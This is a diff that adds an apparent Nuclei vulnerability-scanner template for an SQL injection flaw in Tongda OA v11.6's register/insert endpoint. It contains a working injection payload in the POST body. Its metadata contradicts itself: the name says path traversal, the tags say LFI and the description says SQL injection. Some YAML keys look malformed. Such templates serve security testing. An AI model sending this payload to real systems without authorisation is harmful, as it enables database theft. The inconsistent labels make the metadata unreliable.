@@ -1,0 +1,38 @@
+id: 通达OA v11.6 insert SQL注入漏洞
+
+info:
+  name: Office Anywhere TongDa - Path Traversal
+  author: pikpikcu
+  severity: critical
+  description: 通达OA v11.6 insert参数包含SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息
+  reference:
+    - https://peiqi.wgpsec.org/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20insert%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: tongda,lfi
+  metadata:
+    max-request: 1
+
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/general/document/index.php/recv/register/insert"
+    
+    Rheader:
+      - Content-Type:application/x-www-form-urlencoded & Accept-Encoding:gzip
+    body:
+      - |
+        title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+        
+
+    matchers-condition: and
+    matchers:
+
+      - type: status
+        status:
+          - 302
+
+# Enhanced by mp on 2022/05/30
